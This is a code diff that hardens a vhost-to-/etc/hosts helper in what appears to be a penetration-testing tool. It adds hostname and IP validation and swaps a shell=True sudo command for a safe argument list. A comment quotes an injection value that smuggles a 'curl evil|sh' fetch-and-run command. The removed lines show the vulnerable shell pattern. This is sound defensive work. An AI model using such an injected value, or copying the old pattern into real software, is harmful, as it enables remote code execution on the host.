@@ -30,6 +30,7 @@ import argparse
 import asyncio
 import logging
 import os
+import re
 import sys
 from pathlib import Path
 from typing import Any
@@ -452,6 +453,13 @@ def _add_vhost_to_hosts(hostname: str, ip: str) -> None:
     direct write, then sudo (no-op if unavailable)."""
     if not hostname or not ip:
         return
+    # SECURITY — hostname/ip come from the TARGET's redirect Location + ffuf vhost
+    # enumeration (attacker-influenced), and flow into a privileged write. Reject
+    # anything that isn't a strict hostname/IP charset so a value like
+    # "x'; curl evil|sh; echo '" can't break out (the old shell=True path was a
+    # target-driven command injection).
+    if not re.fullmatch(r"[A-Za-z0-9.\-]{1,253}", hostname) or not re.fullmatch(r"[0-9a-fA-F:.]{1,45}", ip):
+        return
     try:
         with open("/etc/hosts", encoding="utf-8") as f:
             if hostname in f.read():
@@ -467,12 +475,14 @@ def _add_vhost_to_hosts(hostname: str, ip: str) -> None:
     try:
         import subprocess
 
+        # argv form (no shell) — even if validation were bypassed, the value can't
+        # reach a shell parser. tee reads the line from stdin.
         subprocess.run(
-            f"echo '{ip} {hostname}' | sudo -n tee -a /etc/hosts",
-            shell=True,
+            ["sudo", "-n", "tee", "-a", "/etc/hosts"],
+            input=f"{ip} {hostname}\n".encode(),
             capture_output=True,
             timeout=10,
-        )  # noqa: S602 — fixed ip/hostname from our own enumeration
+        )
     except Exception:  # noqa: BLE001
         pass
 
